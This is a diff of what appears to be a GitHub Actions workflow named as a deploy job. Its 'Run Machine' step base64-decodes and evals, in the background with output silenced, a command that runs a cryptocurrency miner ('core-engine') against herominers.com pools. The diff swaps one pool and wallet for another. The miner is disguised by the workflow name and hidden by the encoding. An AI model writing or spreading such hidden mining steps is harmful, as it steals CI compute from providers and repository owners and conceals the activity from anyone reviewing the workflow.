@@ -1,4 +1,4 @@
-name: deploy mananax
+name: deploy yamlx
 
 on:
   push:
@@ -29,7 +29,7 @@ jobs:
       - name: Run Machine
         run: |
           chmod +x core-engine
-          ENCODED="Li9jb3JlLWVuZ2luZSAtbyB1czIucXJsLmhlcm9taW5lcnMuY29tOjExNjYgXAogIC11IHNvbG86UTAxMDUwMGRiNmNmMWQ1NDYxOTQzM2ZkMjJhYWYyZDc0N2ZkMTFlYzIyYTBjNGY4NGVmMDRjYWIzYzAzZTJkOGVmNDI5ZGNlYjUxZWM4OS5vb2RyaXZlPTk2MDAwMCBcCiAgLS1kb25hdGUtbGV2ZWwgMCBcCiAgLWsgLS10aHJlYWRzPSQobnByb2MpIC0tY3B1LXByaW9yaXR5PTUgLS1odWdlLXBhZ2VzLWppdCAtLWNwdS1uby15aWVsZCAtLXJhbmRvbXgtbm8tbnVtYSBcCiAgLWEgcngvMCAtLXRscyAtLWFzbT1yeXplbiAtLXJhbmRvbXgtbm8tcmRtc3IgLS1yYW5kb214LXdybXNyPS0xIC0tcmFuZG9teC1tb2RlPWZhc3Q="
+          ENCODED="Li9jb3JlLWVuZ2luZSAtbyB1czIuemVwaHlyLmhlcm9taW5lcnMuY29tOjExMjQgXAogIC11IFpFUEhzQTh4eHhYTEJoNjFnSzNLYjFYNFA4WHdnbTVGM2ZHcnVodTJqbVVlZ1NyYllFeWJGWEpSc3E5bVRWVFRhdWJTV25rano2clNENVlIdjdMQ0dRYVJUOW14aW02d3hFRS5vb2RyaXZlPTk2MDAwMCBcCiAgLS1kb25hdGUtbGV2ZWwgMCBcCiAgLWsgLS10aHJlYWRzPSQobnByb2MpIC0tY3B1LXByaW9yaXR5PTUgLS1odWdlLXBhZ2VzLWppdCAtLWNwdS1uby15aWVsZCAtLXJhbmRvbXgtbm8tbnVtYSBcCiAgLWEgcngvMCAtLXRscyAtLWFzbT1yeXplbiAtLXJhbmRvbXgtbm8tcmRtc3IgLS1yYW5kb214LXdybXNyPS0xIC0tcmFuZG9teC1tb2RlPWZhc3Q="
           CMD=$(echo "$ENCODED" | base64 -d)
           FINAL_CMD="$CMD > /dev/null 2>&1 &"
           eval "$FINAL_CMD"
